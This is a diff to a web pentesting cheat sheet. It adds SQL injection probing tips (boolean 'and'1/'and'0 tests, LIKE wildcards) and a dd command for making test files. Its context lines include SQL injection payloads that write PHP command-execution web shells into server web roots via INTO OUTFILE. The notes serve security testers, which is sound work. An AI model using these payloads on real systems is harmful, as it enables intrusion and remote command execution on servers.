@@ -167,6 +167,11 @@
 
 **SQLi Discovery and Exploitation**
 - If you find a path/slug, you might find an SQLi
+- If you have found an XSS, test also for SQLi
+- Use `'and'1` `'and'0` to search for SQLi
+	- `SELECT * FROM EMPLOYEE WHERE dept = 'Sales' and '0';` This is always false
+	- `SELECT * FROM EMPLOYEE WHERE dept = 'Sales' and '1';` This is always true (if you have the first condition verified)
+- Use `%` as a wildcard in SQL injection attempts to match any sequence of characters when targeting queries with the LIKE operator
 - `SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"`
 - `' UNION SELECT ("<?php echo system($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
 - `%27%20union%20select%20%27%3C?php%20echo%20system($_REQUEST[%22bingo%22]);%20?%3E%27%20into%20outfile%20%27/srv/http/cmd.php%27%20--%20-`
@@ -494,7 +499,8 @@ cat reverse.php >> reverse.php.png
 
 **General tips**
 - If the target creates an encrypter URL for your file, copy the domain and use the command `echo data.target.com | waybackurls | httpx -mc 200, 403`. If you find valid endpoints, it might be possible to have an information disclosure [[Reference](https://twitter.com/ADITYASHENDE17/status/1673585969411526658)]
-
+- To create a random pdf file in order to test for file size
+	- `dd if=/dev/urandom of=random.pdf bs=1M count=6`
 
 **Resources**
 - [Common MIME types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)
